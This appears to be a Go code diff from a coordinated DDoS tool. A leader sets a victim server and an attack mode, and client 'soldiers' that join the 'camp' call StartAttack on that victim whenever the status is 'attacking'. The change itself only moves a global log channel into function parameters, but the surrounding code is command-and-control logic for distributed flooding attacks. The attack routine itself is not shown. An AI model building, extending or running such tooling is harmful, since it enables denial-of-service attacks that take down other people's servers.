@@ -12,8 +12,6 @@ import (
 	"time"
 )
 
-var LogChan = make(chan string, 10)
-
 type Leader struct {
 	Client
 	Password string
@@ -125,7 +123,7 @@ func (l *Leader) UpdateCampSettings(settings CampSettings) error {
 	}
 }
 
-func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI) {
+func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) {
 	prevCmp := c.GetCamp()
 	ChangedDataChan <- prevCmp
 	stopchan := make(chan bool, 1)
@@ -141,13 +139,13 @@ func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI) {
 			}
 			ChangedDataChan <- cmp
 			if cmp.Settings.DDOSType != prevCmp.Settings.DDOSType {
-				LogChan <- "change attack mode " + cmp.Settings.DDOSType
+				logChan <- "change attack mode " + cmp.Settings.DDOSType
 			}
 			if cmp.Settings.Status == "attacking" {
 				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan)
 			}
 			if cmp.Settings.VictimServer != prevCmp.Settings.VictimServer {
-				LogChan <- "Victim server changed to " + cmp.Settings.VictimServer
+				logChan <- "Victim server changed to " + cmp.Settings.VictimServer
 			}
 
 			if cmp.Settings.Status == "stopped" {
@@ -163,7 +161,7 @@ func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI) {
 	}
 }
 
-func (c *Client) Start() {
+func (c *Client) Start(logChan chan string) {
 	err := c.JoinCamp()
 	if err != nil {
 		//check if error contain connection refused
@@ -180,12 +178,12 @@ func (c *Client) Start() {
 	wg := sync.WaitGroup{}
 	wg.Add(1)
 	go func() {
-		c.ListenAndDo(ChangedDataChan)
+		c.ListenAndDo(ChangedDataChan, logChan)
 		wg.Done()
 	}()
 
 	go func() {
-		StartSoldierView(ChangedDataChan)
+		StartSoldierView(ChangedDataChan, logChan)
 		wg.Done()
 	}()
 	wg.Wait()
@@ -208,7 +206,7 @@ func (l *Leader) ListenChangeView(changedDataChan chan CampAPI) {
 }
 func (l *Leader) Start() {
 	var changedDataChan = make(chan CampAPI, 1)
-
+	logChan := make(chan string, 10)
 	wg := sync.WaitGroup{}
 	wg.Add(1)
 
@@ -217,7 +215,7 @@ func (l *Leader) Start() {
 		wg.Done()
 	}()
 	go func() {
-		l.StartLeaderView(changedDataChan)
+		l.StartLeaderView(changedDataChan, logChan)
 		wg.Done()
 	}()
 	wg.Wait()
